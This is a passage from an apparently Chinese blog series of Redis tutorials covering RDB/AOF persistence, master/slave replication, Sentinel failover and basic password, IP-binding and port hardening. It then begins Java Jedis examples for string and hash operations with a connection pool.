指定RDB文件的存储位置，默认是./当前目录</p><p>配置步骤:<br>1) 查看ps -ef | grep redis, 如果服务启动，先停止。<br>2) 修改redis.conf文件，修改前先备份，执行cp redis.conf redis.conf.bak<br>查看默认启用的RDB文件<br><img src="/images/redis/redis132.png" alt="Redis"><br>3) 编辑redis.conf增加save配置，修改文件名等。vim redis.conf<br><img src="/images/redis/redis133.png" alt="Redis"><br>修改的内容:<br><img src="/images/redis/redis134.png" alt="Redis"><br><img src="/images/redis/redis135.png" alt="Redis"><br>把原来的默认的dump.rdb删除，修改redis.conf后，重新启动redis<br>4) 在20秒内修改三个key的值<br><img src="/images/redis/redis136.png" alt="Redis"><br>5) 查看生成的rdb文件<br><img src="/images/redis/redis137.png" alt="Redis"></p><h6 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h6><p>优点: 由于存储的是数据快照文件，恢复数据很方便，也比较快<br>缺点:<br>1) 会丢失最后一次快照以后更改的数据。如果你的应用能容忍一定数据的丢失，那么使用rdb是不错的选择；如果你不能容忍一定数据的丢失，使用rdb就不是一个很好的选择。<br>2) 由于需要经常操作磁盘，RDB会分出一个子进程。如果你的reids数据库很大的话，子进程占用比较多的时间，并且可能会影响Redis暂停服务一段时间(millisecond级别),如果你的数据库超级大并且你的服务器CPU比较弱，有可能是会达到一秒。</p><h5 id="AOF方式"><a href="#AOF方式" class="headerlink" title="AOF方式"></a>AOF方式</h5><h6 id="什么是AOF方式"><a href="#什么是AOF方式" class="headerlink" title="什么是AOF方式"></a>什么是AOF方式</h6><p>Append-only File(AOF)，Redis每次接受到一条改变数据的命令是，它将把该命令写到一个AOF文件中(只记录写操作，读操作不记录),当Redis重启时，它通过执行AOF文件中所有的命令来恢复数据。</p><h6 id="如何实现-1"><a href="#如何实现-1" class="headerlink" title="如何实现"></a>如何实现</h6><p>AOF方式的数据持久化，仅需在redis.conf文件中配置即可<br>配置项:<br>1) appendonly: 默认是no，改成yes即开启了aof持久化<br>2) appendfilename: 指定AOF文件名，默认文件名为:appendonly.aof<br>3) dir: 指定RDB和AOF文件存放的目录，默认是./<br>4) appendfsync： 配置向aof文件写命令数据的策略:<br>no： 不主动进行同步操作，而是完全交由操作系统来做(即每30秒一次)，比较快但不是很安全。<br>always: 每次执行写入都会执行同步，慢一些但是比较安全。<br>everysec: 每秒执行一次同步操作,比较平衡,介于速度和安全之间。这是默认项。<br>5) auto-aof-rewrite-min-size： 允许重写的最小AOF文件大小，默认是64M。当aof文件大于64M时，开始整理aop文件，去掉无用的操作命令。缩小aop文件。</p><p>例1:<br>1) 停止运行的reids，备份要修改的redis.conf<br>2) 查看redis安装目录/src下有无.aof文件。默认是在redis的当前目录<br><img src="/images/redis/redis138.png" alt="Redis"><br>3) 编辑redis.conf<br>设置appendonly为yes即可。<br>查看appendfsync的当前策略。<br>查看appendfilename的文件名称。<br><img src="/images/redis/redis139.png" alt="Redis"><br><img src="/images/redis/redis140.png" alt="Redis"><br>4) 在redis客户端执行 写入命令<br><img src="/images/redis/redis141.png" alt="Redis"><br>5) 查看aof文件<br><img src="/images/redis/redis142.png" alt="Redis"><br><img src="/images/redis/redis143.png" alt="Redis"></p><h6 id="总结-1"><a href="#总结-1" class="headerlink" title="总结"></a>总结</h6><p>1) append-only文件是另一个可以提供完全数据保障的方案<br>2) AOF文件会在操作过程中变得越来越大。比如，如果你做一百次加法计算，最后你只会在数据库里面得到最终的数值，但是在你的AOF里面会存在100次记录，其中99条记录对最终的结果都是无用的；但Redis支持在不影响服务的前提下在后台重构AOF文件，让文件得以整理变小。<br>3) 可以同时使用这两种当时，redis默认优先加载aof文件(aof数据最完整);</p><h3 id="主从复制"><a href="#主从复制" class="headerlink" title="主从复制"></a>主从复制</h3><h4 id="主从复制–读写分离"><a href="#主从复制–读写分离" class="headerlink" title="主从复制–读写分离"></a>主从复制–读写分离</h4><p>通过持久化功能，Redis保证了即使在服务器重启的情况下也不会丢失(或少量丢失)数据，但是由于数据是存储在一台服务器上的，如果这台服务器出现故障，比如硬盘坏了，也会导致数据丢失。<br>为了避免单点故障，我们需要将数据复制多份部署在多台不同的服务器上，即使有一台服务器出现故障其他扶我去依然可以继续提供服务。<br>这就要求当一台服务器上的数据更新后，自动将更新的数据同步到其他服务器上，那该怎么实现呢?Redis的主从复制。<br><img src="/images/redis/redis144.png" alt="Redis"><br>Redis提供了复制(replication)功能来自动实现多台redis服务器的数据同步(每天19点新闻联播,基本从cctv1-8，各大卫视都会播放)<br>我们可以通过部署多台redis，并在配置文件中指定这几台redis之间的主从关系，主负责写入数据，同时把写入的数据实时同步到从机器，这种模式叫做主从复制，即master/slave,并且redis默认master用于写，slave用于读，向slave写数据会导致错误。</p><h5 id="Redis主从复制实现-master-salve"><a href="#Redis主从复制实现-master-salve" class="headerlink" title="Redis主从复制实现(master/salve)"></a>Redis主从复制实现(master/salve)</h5><p>方式1: 修改配置文件，启动时，服务器读取配置文件，并自动成为指定服务器的从服务器，从而构成主从复制的关系。<br>方式2: ./redis-server -slaveof &lt;master-ip&gt; &lt;master-port&gt;,在启动redis时指定当前服务成为某个主Redis服务器的从Slave。</p><p>方式1的实现步骤:<br>模拟多Redis服务器，在一台已经安装Redis的机器上，运行多个Redis应用模拟多个Redis服务器。一个Master，两个Slave。</p><h6 id="新建三个Redis的配置文件"><a href="#新建三个Redis的配置文件" class="headerlink" title="新建三个Redis的配置文件"></a>新建三个Redis的配置文件</h6><p>如果Redis启动，先停止。<br>作为Master的Redis端口是6380<br>作为Slave的Redis端口分别是6382，6384<br>从原有的redis.conf拷贝三份，分别命名为redis6380.conf,redis6382.conf, redis6384.conf<br><img src="/images/redis/redis145.png" alt="Redis"></p><h6 id="编辑Master配置文件"><a href="#编辑Master配置文件" class="headerlink" title="编辑Master配置文件"></a>编辑Master配置文件</h6><p>编辑Master的配置文件redis6380.conf: 在空文件加入如下内容<br>include /usr/local/redis-3.2.9/redis.conf<br>daemonize yes<br>port 6380<br>pidfile /var/run/redis_6380.pid<br>logfile 6380.log<br>dbfilename dump6380.rdb</p><p>配置项说明:<br>include： 包含原来的配置文件内容。/usr/local/redis-3.3.9/redis.conf按照自己的目录设置。<br>daemonize: yes 后台启动应用,相当于./redis-server &amp;， &amp;的作用。<br>port: 自定义的端口号<br>pidfile: 自定义的文件，表示当前程序的pid,进程id。<br>logfile: 日志文件<br>dbfilename: 持久化的rdb文件名</p><h6 id="编辑Slave配置文件"><a href="#编辑Slave配置文件" class="headerlink" title="编辑Slave配置文件"></a>编辑Slave配置文件</h6><p>编辑Slave的配置文件redis6382.conf和redis6384.conf： 在空文件加入如下内容<br>1） redis6382.conf:<br>include /usr/local/redis-3.2.9/redis.conf<br>daemonize yes<br>port 6382<br>pidfile /var/run/redis_6382.pid<br>logfile 6382.log<br>dbfilename dump6382.rdb<br>slaveof 127.0.0.1 6380</p><p>配置项说明:<br>slaveof： 表示当前Redis是谁的从。当前是127.0.0.1 端口是6380这个Master的从。</p><p>2） redis6384.conf:<br>include /usr/local/redis-3.2.9/redis.conf<br>daemonize yes<br>port 6384<br>pidfile /var/run/redis_6384.pid<br>logfile 6384.log<br>dbfilename dump6384.rdb<br>slaveof 127.0.0.1 6380</p><h6 id="启动服务器-Master-Slave都启动"><a href="#启动服务器-Master-Slave都启动" class="headerlink" title="启动服务器 Master/Slave都启动"></a>启动服务器 Master/Slave都启动</h6><p>启动方式 ./redis-server 配置文件<br>启动Redis，并查看启动进程<br><img src="/images/redis/redis146.png" alt="Redis"></p><h6 id="查看配置后的服务信息"><a href="#查看配置后的服务信息" class="headerlink" title="查看配置后的服务信息"></a>查看配置后的服务信息</h6><p>命令:<br>1) Reids客户端使用指定端口连接Redis服务器<br>./redis-cli -p 端口<br>2) 查看服务器信息<br>info replication</p><p>登录到Master: 6380</p><p><img src="/images/redis/redis147.png" alt="Redis"><br>查看当前服务信息<br>在客户端的Redis内执行命令 info replication<br>Master服务的查看结果:<br><img src="/images/redis/redis148.png" alt="Redis"></p><p>在新的Xshell窗口分别登录到6382，6384查看信息<br><img src="/images/redis/redis149.png" alt="Redis"><br>6384登录内容也同6382。</p><h6 id="向Master写入数据"><a href="#向Master写入数据" class="headerlink" title="向Master写入数据"></a>向Master写入数据</h6><p>在6380执行flushall清除数据，避免干扰的测试数据。生产环境避免使用。<br><img src="/images/redis/redis150.png" alt="Redis"></p><h6 id="在从Salve读数据"><a href="#在从Salve读数据" class="headerlink" title="在从Salve读数据"></a>在从Salve读数据</h6><p>6382,6384都可以读主Master的数据，不能写<br><img src="/images/redis/redis151.png" alt="Redis"></p><p>Salve写数据失败<br><img src="/images/redis/redis152.png" alt="Redis"></p><h5 id="容灾处理"><a href="#容灾处理" class="headerlink" title="容灾处理"></a>容灾处理</h5><p>当Master服务出现故障，需手动将slave中的一个提升为master，剩下的slave挂至新的master上(冷处理:机器挂掉了，再处理)<br>命令:<br>1) slaveof no one, 将一台slave服务器提升为Master(提升某slave为master)<br>2) slaveof 127.0.0.1 6381 (将slave挂至新的master上)</p><p>执行步骤:</p><h6 id="将Master-6380停止-模拟挂掉"><a href="#将Master-6380停止-模拟挂掉" class="headerlink" title="将Master:6380停止 (模拟挂掉)"></a>将Master:6380停止 (模拟挂掉)</h6><p><img src="/images/redis/redis153.png" alt="Redis"><br><img src="/images/redis/redis154.png" alt="Redis"></p><h6 id="选择一个Slave升到Master，其它的Slave挂到新提升的Master"><a href="#选择一个Slave升到Master，其它的Slave挂到新提升的Master" class="headerlink" title="选择一个Slave升到Master，其它的Slave挂到新提升的Master"></a>选择一个Slave升到Master，其它的Slave挂到新提升的Master</h6><p><img src="/images/redis/redis155.png" alt="Redis"></p><h6 id="将其它Slave挂到新的Master"><a href="#将其它Slave挂到新的Master" class="headerlink" title="将其它Slave挂到新的Master"></a>将其它Slave挂到新的Master</h6><p>在Slave 6384身上执行<br><img src="/images/redis/redis156.png" alt="Redis"><br>现在的主(Master/Slave)关系: Master是6382， Slave是6384<br>查看6382:<br><img src="/images/redis/redis157.png" alt="Redis"></p><h6 id="原来的服务器重新添加到主从结构中"><a href="#原来的服务器重新添加到主从结构中" class="headerlink" title="原来的服务器重新添加到主从结构中"></a>原来的服务器重新添加到主从结构中</h6><p>6380的服务器修改后，从新工作，需要把它添加到现有的Master/Slave中<br>先启动6380的Redis服务<br><img src="/images/redis/redis158.png" alt="Redis"><br>连接到6380端口<br><img src="/images/redis/redis159.png" alt="Redis"><br>当前服务挂到Master上<br><img src="/images/redis/redis160.png" alt="Redis"></p><h6 id="查看新的Master信息"><a href="#查看新的Master信息" class="headerlink" title="查看新的Master信息"></a>查看新的Master信息</h6><p>在6382执行:<br><img src="/images/redis/redis161.png" alt="Redis"><br>现在的Master/Slave关系是:<br>Master: 6382<br>Slave: 6380<br>Slave: 6384</p><h5 id="操作命令"><a href="#操作命令" class="headerlink" title="操作命令"></a>操作命令</h5><p>进入客户端需指定端口 ./redis-cli -p 6380<br>不配置启动默认都是主master<br>info replication 查看redis服务器所处角色</p><h5 id="总结-2"><a href="#总结-2" class="headerlink" title="总结"></a>总结</h5><p>1) 一个master可以有多个slave<br>2) salve下线，读请求的处理性能下降<br>3) master下线，写请求无法执行<br>4) 当master发生故障，需手动将其中一条slave使用slaveof no noe命令提示为master，其它slave执行slaveof命令指向这个新的master，从新的master处同步数据<br>5) 主从复制模式的故障转移需要手动操作，要实现自动化处理，这就需要Sentinel哨兵，实现故障自动转移。</p><h4 id="高可用Sentinel哨兵"><a href="#高可用Sentinel哨兵" class="headerlink" title="高可用Sentinel哨兵"></a>高可用Sentinel哨兵</h4><p>Snentinel哨兵是redis官方提供的高可用方案，可用用它来监控多个Redis服务实例的运行情况。Redis Sendtinel是一个运行在特使模式下的Redis服务器。Redis Sentinel是在多个Sentinel进程环境下相互协作工作的。</p><p>Sentinel系统有三个主要任务</p><ul><li>监控: Sentinel不断的检查主服务和从服务器是否按照预期正常工作。</li><li>提醒: 被监控的Redis出现问题时，Sentinel会通知管理员或其他应用程序。</li><li>自动故障转移: 监控的主Redis不能正常工作，Sentinel会开始进行故障迁移操作。将一个从服务器升级新的主服务器。让其他从服务器挂到新的主服务器。同时向客户端提供新的主服务器地址。<br><img src="/images/redis/redis162.png" alt="Redis"></li></ul><h5 id="Sentinel配置"><a href="#Sentinel配置" class="headerlink" title="Sentinel配置"></a>Sentinel配置</h5><p>Sentinel配置文件<br>复制三份Sentinel.conf文件:<br><img src="/images/redis/redis163.png" alt="Redis"></p><p>Sentinel系统默认port是26379。 三个配置port分别设置为26380， 26382， 26384。<br>三个文件分别命名为:</p><ul><li>sentinel26380.conf</li><li>sentinel26382.conf</li><li>sentinel26384.conf<br>执行复制命令 cp sentinel.conf xxx.conf<br><img src="/images/redis/redis164.png" alt="Redis"></li></ul><h5 id="三份sentinel配置文件修改"><a href="#三份sentinel配置文件修改" class="headerlink" title="三份sentinel配置文件修改:"></a>三份sentinel配置文件修改:</h5><p>1) 修改port 26380、 port 26382、 port 26384<br>2) 修改sentinel monitor mymaster 127.0.0.1 6380 2<br>格式: sentinel monitor &lt;name&gt; &lt;masterIP&gt; &lt;masterPort&gt; &lt;Quorum投票数&gt;</p><p>Sentinel监控主(Master)Redis,Sentinel根据Master的配置自动发现Master的Slave，Sentinel默认端口号为26379。<br><img src="/images/redis/redis165.png" alt="Redis"><br>sentinel26380.conf<br>1) 修改port<br><img src="/images/redis/redis166.png" alt="Redis"><br>2) 修改监控的master地址<br><img src="/images/redis/redis167.png" alt="Redis"><br>sentinel26382.conf 修改port 26382， master的port 6382<br>sentinel26384.conf 修改port 26384， master的port 6382</p><h5 id="启动主从-Master-Slave-Redis"><a href="#启动主从-Master-Slave-Redis" class="headerlink" title="启动主从(Master/Slave) Redis"></a>启动主从(Master/Slave) Redis</h5><p>启动Redis<br><img src="/images/redis/redis168.png" alt="Redis"></p><p>查看Master的配置信息<br>连接到6382<br><img src="/images/redis/redis169.png" alt="Redis"><br>使用info命令查看Master/Slave<br><img src="/images/redis/redis170.png" alt="Redis"></p><h5 id="启动Sentinel"><a href="#启动Sentinel" class="headerlink" title="启动Sentinel"></a>启动Sentinel</h5><p>redis安装时make编译后就产生了redis-sentinel程序文件，可以在一个redis中运行多个sentinel进程。</p><p>启动一个运行在Sentinel模式下的Redis服务实例<br>./redis-sentinel sentinel配置文件</p><p>执行以下三条命令，将创建三个监视主服务器的Sentinel实例<br>./redis-sentinel ../sentinel26380.conf<br>./redis-sentinel ../sentinel26382.conf<br>./redis-sentinel ../sentinel26384.conf</p><p>在XShell开启三个窗口分别执行:<br><img src="/images/redis/redis171.png" alt="Redis"><br><img src="/images/redis/redis172.png" alt="Redis"><br><img src="/images/redis/redis173.png" alt="Redis"></p><h5 id="主Redis不能工作"><a href="#主Redis不能工作" class="headerlink" title="主Redis不能工作"></a>主Redis不能工作</h5><p>让Master的Redis停止服务，执行shutdown<br>先执行info replication确认Master的Redis，在执行shutdown<br><img src="/images/redis/redis174.png" alt="Redis"></p><p>查看当前Redis的进程情况<br><img src="/images/redis/redis175.png" alt="Redis"></p><h5 id="Sentinel起的作用"><a href="#Sentinel起的作用" class="headerlink" title="Sentinel起的作用"></a>Sentinel起的作用</h5><p>在Master执行shutdown后，稍微等一会Sentinel要进行投票计算，从可用的Slave选举新的Master。<br>查看Sentinel日志，三个Sentinel窗口的日志是一样的。<br><img src="/images/redis/redis176.png" alt="Redis"></p><p>查看新的Master<br><img src="/images/redis/redis177.png" alt="Redis"></p><p>查看原Slave的变化<br><img src="/images/redis/redis178.png" alt="Redis"></p><h5 id="新的Redis加入Sentinel系统，自动加入Master"><a href="#新的Redis加入Sentinel系统，自动加入Master" class="headerlink" title="新的Redis加入Sentinel系统，自动加入Master"></a>新的Redis加入Sentinel系统，自动加入Master</h5><p>重新启动6382<br><img src="/images/redis/redis179.png" alt="Redis"><br>查看6384的信息<br><img src="/images/redis/redis180.png" alt="Redis"><br>测试数据：在Master写入数据<br><img src="/images/redis/redis181.png" alt="Redis"><br>在6382写入数据，不能写入<br><img src="/images/redis/redis182.png" alt="Redis"></p><h5 id="监控"><a href="#监控" class="headerlink" title="监控"></a>监控</h5><p>1) Sentinel会不断检查Master和Slave是否正常。<br>2) 如果Sentinel挂了，就无法监控，所以需要多个哨兵，组成Sentinel网络，一个健康的Sentinel至少有3个应用。彼此在独立的物理机器或虚拟机。<br>3) 监控同一个Master的Sentinel会自动连接，组成一个分布式的Sentinel网络，互相通信并交换彼此关于被监控服务器的信息。<br>4) 当一个Sentinel认为被监控的服务器已经下线时，它会向网络中的其它Sentinel进行确认，判断该服务器是否真的已经下线。<br>5) 如果下线的服务器为主服务器，那么Sentinel网络将对下线主服务器进行自动故障转移，通过将下线的主服务的某个服务器提升为新的主服务器，并让其从服务器转移到新的主服务器下，以此来让系统重新回到正常状态。<br>6) 下线的旧主服务器重新上线，Sentinel会让它成为从，挂到新的主服务器下。</p><h5 id="总结-3"><a href="#总结-3" class="headerlink" title="总结"></a>总结</h5><p>主从复制，解决了读请求的负担，从节点下线，会使得读请求能力有所下降，Master下线，写请求无法执行。<br>Sentinel会在Master下线后自动执行故障转移操作，提升一台Slave为Master，并让其它Slave成为新的Master的Slave。</p><h3 id="安全设置"><a href="#安全设置" class="headerlink" title="安全设置"></a>安全设置</h3><h4 id="设置密码"><a href="#设置密码" class="headerlink" title="设置密码"></a>设置密码</h4><p>访问Redis默认是没有密码的，这样不安全，任意用户都可以访问。可以启动使用密码才能访问Redis。设置Redis的访问密码，修改redis.conf中这行requirepass密码。密码要比较复杂，不容易破解，而且需要定期修改。因为redis速度相当快，所以在一台比较好的服务器下，一个外部用户可以再一秒钟进行150K次的密码尝试，需要指定非常非常强的密码来防止暴力破解。</p><h5 id="开启访问密码设置"><a href="#开启访问密码设置" class="headerlink" title="开启访问密码设置"></a>开启访问密码设置</h5><p>修改redis.conf，使用vim命令。找到requirepass行去掉注释，requirepass空格后就是密码。<br>例1: 设置访问密码是123456，这是练习使用，生产环境要设置复杂的密码<br>修改redis.conf，文件480行左右。原始内容:<br><img src="/images/redis/redis183.png" alt="Redis"><br>修改后:<br><img src="/images/redis/redis184.png" alt="Redis"><br>查看修改结果:<br><img src="/images/redis/redis185.png" alt="Redis"></p><h5 id="访问有密码的Redis"><a href="#访问有密码的Redis" class="headerlink" title="访问有密码的Redis"></a>访问有密码的Redis</h5><p>如果Redis已经启动，关闭后重新启动。</p><p>访问有密码的Redis两种方式:<br>1) 在连接到客户端后,使用命令auth 密码，命令执行成功后，可以正常使用Redis<br>2) 在连接客户端时使用-a密码。例如./redis-cli -h ip -p port -a password</p><p>启动Redis<br><img src="/images/redis/redis186.png" alt="Redis"><br>使用1)访问<br><img src="/images/redis/redis187.png" alt="Redis"><br>输入命令auth密码<br><img src="/images/redis/redis188.png" alt="Redis"></p><p>使用2)方式<br><img src="/images/redis/redis189.png" alt="Redis"></p><h4 id="绑定ip"><a href="#绑定ip" class="headerlink" title="绑定ip"></a>绑定ip</h4><p>修改redis.conf文件，把# bind 127.0.0.1前面的注释#去掉，然后把127.0.0.1改成允许访问你redis服务器的ip地址，表示只允许该ip进行访问。多个ip使用空格分割。<br>例如 bind 192.168.1.100 192.168.1.10</p><h4 id="修改默认端口"><a href="#修改默认端口" class="headerlink" title="修改默认端口"></a>修改默认端口</h4><p>修改redis的端口，这一点很重要，使用默认的端口很危险，redis.conf中修改port 6379将其修改为自己指定的端口(可随意),端口1024是保留给操作系统使用的。用户可以使用的范围是1024-65535<br><img src="/images/redis/redis190.png" alt="Redis"></p><p>使用 -p 参数指定端口，例如: ./redis-cli -p 新设置端口</p>]]></content>
      <categories>
        <category>数据库</category>
        <category>Redis</category>
      </categories>
      <tags>
        <tag>Redis</tag>
      </tags>
  </entry>
  <entry>
    <title>第5章 Jedis操作Redis</title>
    <url>/%E6%95%B0%E6%8D%AE%E5%BA%93/Redis/d5d71bc6.html</url>
    <content><![CDATA[<h2 id="Jedis操作Redis"><a href="#Jedis操作Redis" class="headerlink" title="Jedis操作Redis"></a>Jedis操作Redis</h2><h3 id="下载Jedis和Commons-Pool"><a href="#下载Jedis和Commons-Pool" class="headerlink" title="下载Jedis和Commons-Pool"></a>下载Jedis和Commons-Pool</h3><h4 id="下载Jedis"><a href="#下载Jedis" class="headerlink" title="下载Jedis"></a>下载Jedis</h4><p>浏览器打开:<a href="http://search.maven.org/" title="jedis" target="_blank" rel="noopener">http://search.maven.org/</a>,搜索jedis，在Download处，点击jar<br><img src="/images/redis/redis191.png" alt="redis"></p><h4 id="下载Commons-Pool"><a href="#下载Commons-Pool" class="headerlink" title="下载Commons-Pool"></a>下载Commons-Pool</h4><p>Jedis对象并不是线程安全的，在多线程下使用同一个Jedis对象会出现并发问题。为了避免每次使用Jedis对象时都需要重新构建，Jedis提供了JedisPool。JedisPool是基于Commons Pool2实现的一个线程安全的连接池。<br>浏览器打开:<a href="http://search.maven.org/" title="commons-pool2" target="_blank" rel="noopener">http://search.maven.org/</a>,搜索commons-pool2，在Download处，点击jar<br><img src="/images/redis/redis192.png" alt="redis"></p><h3 id="Java应用使用Jedis准备"><a href="#Java应用使用Jedis准备" class="headerlink" title="Java应用使用Jedis准备"></a>Java应用使用Jedis准备</h3><p>项目中加入jar:</p><ul><li>jedis-3.0.1.jar</li><li>commons-pool2-2.6.1.jar</li><li>slf4j-api-1.7.26.jar(commons-pool2-2.6.1.jar依赖日志组件)<br>加入后如下图:<br><img src="/images/redis/redis193.png" alt="redis"><h4 id="字符串-string"><a href="#字符串-string" class="headerlink" title="字符串(string)"></a>字符串(string)</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> club.smartdot.string;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> redis.clients.jedis.Jedis;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">RedisString</span> </span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">		<span class="comment">// 创建Jedis对象,连接到Redis,需要提供ip和port</span></span><br><span class="line">		Jedis jedis  = <span class="keyword">new</span> Jedis(<span class="string">"127.0.0.1"</span>, <span class="number">6379</span>);</span><br><span class="line">		<span class="comment">// 添加字符串</span></span><br><span class="line">		jedis.set(<span class="string">"breakfast"</span>, <span class="string">"豆浆和包子"</span>);</span><br><span class="line">		String mybreak = jedis.get(<span class="string">"breakfast"</span>);</span><br><span class="line">		System.out.println(<span class="string">"我的早餐1:"</span> + mybreak);</span><br><span class="line">		</span><br><span class="line">		<span class="comment">// 追加内容</span></span><br><span class="line">		jedis.append(<span class="string">"breakfast"</span>, <span class="string">"还有鸡蛋"</span>);</span><br><span class="line">		mybreak = jedis.get(<span class="string">"breakfast"</span>);</span><br><span class="line">		System.out.println(<span class="string">"我的早餐2:"</span> + mybreak);</span><br><span class="line">		</span><br><span class="line">		<span class="comment">// 一次设置多个key-value</span></span><br><span class="line">		jedis.mset(<span class="string">"lunch"</span>, <span class="string">"红烧肉"</span>, <span class="string">"dinner"</span>, <span class="string">"牛肉面"</span>);</span><br><span class="line">		<span class="comment">// 获取多个key的value</span></span><br><span class="line">		List&lt;String&gt; dinners = jedis.mget(<span class="string">"lunch"</span>, <span class="string">"dinner"</span>);</span><br><span class="line">		<span class="keyword">for</span> (String dinner : dinners) &#123;</span><br><span class="line">			System.out.println(<span class="string">"我吃的是"</span> + dinner);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><h4 id="哈希-hash"><a href="#哈希-hash" class="headerlink" title="哈希(hash)"></a>哈希(hash)</h4><p>1) 使用Jedis连接实例池</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> club.smartdot.util;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> redis.clients.jedis.JedisPool;</span><br><span class="line"><span class="keyword">import</span> redis.clients.jedis.JedisPoolConfig;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">RedisUtil</span> </span>&#123;</span><br><span class="line">	<span class="comment">// 定义连接池对象</span></span><br><span class="line">	<span class="keyword">private</span> <span class="keyword">static</span> JedisPool pool = <span class="keyword">null</span>;</span><br><span class="line">	<span class="comment">// 创建连接池</span></span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> JedisPool <span class="title">open</span><span class="params">(String host, <span class="keyword">int</span> port)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">if</span>(pool == <span class="keyword">null</span>) &#123;</span><br><span class="line">			<span class="comment">// 使用JedisPool</span></span><br><span class="line">			JedisPoolConfig config = <span class="keyword">new</span> JedisPoolConfig();</span><br><span class="line">			<span class="comment">// 最大的Jedis实例数(连接池中是Jedis实例，默认是8)</span></span><br><span class="line">			config.setMaxTotal(<span class="number">10</span>);</span><br><span class="line">			<span class="comment">// 最大的空闲实例数,设置这个可以保留足够的连接，快速的获取到Jedis对象</span></span><br><span class="line">			config.setMaxIdle(<span class="number">3</span>);</span><br><span class="line">			<span class="comment">// 提前检查Jedis对象,为true获取的Jedis一定是可用的</span></span><br><span class="line">			config.setTestOnBorrow(<span class="keyword">true</span>);</span><br><span class="line">			<span class="comment">// 创建Jedis连接池，Redis没有访问密码时的使用方式</span></span><br><span class="line">			<span class="comment">// pool = new JedisPool(config, host, port);</span></span><br><span class="line">			<span class="comment">/**</span></span><br><span class="line"><span class="comment">			 * 创建Jedis连接池，Redis有访问密码时的使用方式</span></span><br><span class="line"><span class="comment">			 * 参数: JedisPoolCOnfig Redis的主机地址 端口 连接超时时间单位毫秒 访问密码</span></span><br><span class="line"><span class="comment">			 */</span></span><br><span class="line">			pool = <span class="keyword">new</span> JedisPool(config, host, port, <span class="number">60</span>*<span class="number">1000</span>, <span class="string">"caifenglin"</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> pool;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="comment">// 关闭连接池</span></span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">close</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		<span class="keyword">if</span>(pool != <span class="keyword">null</span>) &#123;</span><br><span class="line">			pool.close();</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>2) 使用连接池操作hash数据类型</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> club.smartdot.hash;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Iterator;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"><span class="keyword">import</span> java.util.Set;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> club.smartdot.util.RedisUtil;</span><br><span class="line"><span class="keyword">import</span> redis.clients.jedis.Jedis;</span><br><span class="line"><span class="keyword">import</span> redis.clients.jedis.JedisPool;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">RedisHash</span> </span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">		<span class="comment">// 创建连接池</span></span><br><span class="line">		JedisPool pool = RedisUtil.open(<span class="string">"127.0.0.1"</span>, <span class="number">6379</span>);</span><br><span class="line">		Jedis jedis = <span class="keyword">null</span>;</span><br><span class="line">		<span class="keyword">try</span> &#123;</span><br><span class="line">			<span class="comment">// 从连接池中获取Jedis对象</span></span><br><span class="line">			jedis = pool.getResource();</span><br><span class="line">			<span class="comment">// 设置hash类型。key:loginuser, filed：username，value: zhangsan</span></span><br><span class="line">			jedis.hset(<span class="string">"loginuser"</span>, <span class="string">"username"</span>, <span class="string">"zhangsan"</span>);</span><br><span class="line">			System.out.println(<span class="string">"username的值:"</span> + jedis.hget(<span class="string">"loginuser"</span>, <span class="string">"username"</span>));</span><br><span class="line">			</span><br><span class="line">			<span class="comment">// 设置多个值</span></span><br><span class="line">			Map&lt;String, String&gt; map = <span class="keyword">new</span> HashMap&lt;&gt;();</span><br><span class="line">			map.put(<span class="string">"username"</span>, <span class="string">"caifenglin"</span>);</span><br><span class="line">			map.put(<span class="string">"age"</span>, <span class="string">"26"</span>);</span><br><span class="line">			map.put(<span class="string">"website"</span>, <span class="string">"www.smartdot.club"</span>);</span><br><span class="line">			jedis.hmset(<span class="string">"logininfo"</span>, map);</span><br><span class="line">			<span class="comment">// 从Redis取hash数据</span></span><br><span class="line">			List&lt;String&gt; fieldValues = jedis.hmget(<span class="string">"logininfo"</span>, <span class="string">"username"</span>, <span class="string">"website"</span>);</span><br><span class="line">			<span class="keyword">for</span> (String fv : fieldValues) &#123;</span><br><span class="line">				System.out.println(<span class="string">"filed值:"</span> + fv);</span><br><span class="line">			&#125;</span><br><span class="line">			</span><br><span class="line">			<span class="comment">// 存在username吗?</span></span><br><span class="line">			System.out.println(<span class="string">"返回boolean,存在username:"</span> + jedis.hexists(<span class="string">"logininfo"</span>, <span class="string">"username"</span>));</span><br><span class="line">			<span class="comment">// 查看所有的field</span></span><br><span class="line">			Set&lt;String&gt; set = jedis.hkeys(<span class="string">"logininfo"</span>);</span><br><span class="line">			